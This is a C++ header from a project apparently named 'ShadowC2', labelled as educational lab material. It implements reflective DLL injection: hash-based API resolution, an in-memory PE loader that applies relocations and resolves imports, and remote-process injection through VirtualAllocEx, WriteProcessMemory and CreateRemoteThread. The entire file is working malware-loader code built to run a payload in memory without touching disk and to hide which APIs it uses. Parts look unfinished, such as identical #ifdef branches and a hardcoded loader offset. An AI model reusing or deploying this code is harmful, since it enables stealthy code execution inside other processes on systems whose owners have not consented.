/**
 * ShadowC2 - Reflective DLL Injection
 * DLL that loads itself without touching disk
 * Laboratorio de Ciberseguridad - Uso Educativo
 */

#pragma once
#include <windows.h>
#include <winternl.h>

namespace ReflectiveDLL {

// Custom loader structures
typedef struct _REFLECTIVE_LOADER {
    PVOID ImageBase;
    PIMAGE_NT_HEADERS NtHeaders;
    PIMAGE_BASE_RELOCATION BaseRelocation;
    PIMAGE_IMPORT_DESCRIPTOR ImportDirectory;
    ULONG_PTR VirtualAlloc;
    ULONG_PTR LoadLibraryA;
    ULONG_PTR GetProcAddress;
} REFLECTIVE_LOADER, *PREFLECTIVE_LOADER;

// Hash function for API resolution
DWORD HashString(LPCSTR string) {
    DWORD hash = 0x1505;
    while (*string) {
        hash = ((hash << 5) + hash) + *string++;
    }
    return hash;
}

// Resolve API by hash
PVOID ResolveAPI(HMODULE hModule, DWORD apiHash) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)hModule + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)hModule + 
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    PDWORD names = (PDWORD)((PBYTE)hModule + exportDir->AddressOfNames);
    PWORD ordinals = (PWORD)((PBYTE)hModule + exportDir->AddressOfNameOrdinals);
    PDWORD functions = (PDWORD)((PBYTE)hModule + exportDir->AddressOfFunctions);
    
    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        LPCSTR apiName = (LPCSTR)((PBYTE)hModule + names[i]);
        if (HashString(apiName) == apiHash) {
            return (PVOID)((PBYTE)hModule + functions[ordinals[i]]);
        }
    }
    return nullptr;
}

// Reflective loader function
extern "C" __declspec(noinline) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter) {
    // Get current image base from return address
    ULONG_PTR imageBase;
    #ifdef _WIN64
    imageBase = (ULONG_PTR)_ReturnAddress();
    #else
    imageBase = (ULONG_PTR)_ReturnAddress();
    #endif
    
    // Align to page boundary and find PE header
    imageBase &= ~0xFFF;
    while (*(WORD*)imageBase != IMAGE_DOS_SIGNATURE) {
        imageBase -= 0x1000;
    }
    
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(imageBase + dosHeader->e_lfanew);
    
    // Allocate new memory for the DLL
    typedef PVOID(WINAPI *pVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
    pVirtualAlloc VirtualAlloc = (pVirtualAlloc)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
    
    PVOID newBase = VirtualAlloc(nullptr, ntHeaders->OptionalHeader.SizeOfImage, 
                                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!newBase) return 0;
    
    // Copy headers
    memcpy(newBase, (PVOID)imageBase, ntHeaders->OptionalHeader.SizeOfHeaders);
    
    // Copy sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        memcpy((PBYTE)newBase + section[i].VirtualAddress,
               (PBYTE)imageBase + section[i].PointerToRawData,
               section[i].SizeOfRawData);
    }
    
    // Process relocations
    PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)((PBYTE)newBase + 
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
    
    ULONG_PTR delta = (ULONG_PTR)newBase - ntHeaders->OptionalHeader.ImageBase;
    
    while (relocation->VirtualAddress) {
        PWORD relInfo = (PWORD)((PBYTE)relocation + sizeof(IMAGE_BASE_RELOCATION));
        DWORD numRelocations = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        
        for (DWORD i = 0; i < numRelocations; i++) {
            if ((relInfo[i] >> 12) == IMAGE_REL_BASED_DIR64) {
                PULONG_PTR p = (PULONG_PTR)((PBYTE)newBase + relocation->VirtualAddress + (relInfo[i] & 0xFFF));
                *p += delta;
            } else if ((relInfo[i] >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                PDWORD p = (PDWORD)((PBYTE)newBase + relocation->VirtualAddress + (relInfo[i] & 0xFFF));
                *p += (DWORD)delta;
            }
        }
        
        relocation = (PIMAGE_BASE_RELOCATION)((PBYTE)relocation + relocation->SizeOfBlock);
    }
    
    // Process imports
    PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)newBase + 
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    
    while (importDesc->Name) {
        LPCSTR dllName = (LPCSTR)((PBYTE)newBase + importDesc->Name);
        HMODULE hModule = LoadLibraryA(dllName);
        
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((PBYTE)newBase + importDesc->FirstThunk);
        PIMAGE_THUNK_DATA origThunk = (PIMAGE_THUNK_DATA)((PBYTE)newBase + importDesc->OriginalFirstThunk);
        
        while (thunk->u1.AddressOfData) {
            if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                thunk->u1.Function = (ULONG_PTR)GetProcAddress(hModule, (LPCSTR)IMAGE_ORDINAL(origThunk->u1.Ordinal));
            } else {
                PIMAGE_IMPORT_BY_NAME importByName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)newBase + origThunk->u1.AddressOfData);
                thunk->u1.Function = (ULONG_PTR)GetProcAddress(hModule, importByName->Name);
            }
            thunk++;
            origThunk++;
        }
        
        importDesc++;
    }
    
    // Call DLL entry point
    typedef BOOL(WINAPI *pDllMain)(HINSTANCE, DWORD, LPVOID);
    pDllMain DllMain = (pDllMain)((PBYTE)newBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
    DllMain((HINSTANCE)newBase, DLL_PROCESS_ATTACH, lpParameter);
    
    return (ULONG_PTR)newBase;
}

// Injection function
bool InjectReflectiveDLL(HANDLE hProcess, const std::vector<BYTE>& dllData) {
    // Allocate memory in target process
    PVOID remoteMem = VirtualAllocEx(hProcess, nullptr, dllData.size(), 
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) return false;
    
    // Write DLL
    if (!WriteProcessMemory(hProcess, remoteMem, dllData.data(), dllData.size(), nullptr)) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return false;
    }
    
    // Create remote thread at loader offset
    // The reflective loader is at a known offset in the DLL
    // In production, would parse PE to find export or use known offset
    
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, 
        (LPTHREAD_START_ROUTINE)((PBYTE)remoteMem + 0x1000), // Offset to loader
        remoteMem, 0, nullptr);
    
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        return false;
    }
    
    CloseHandle(hThread);
    return true;
}

} // namespace ReflectiveDLL
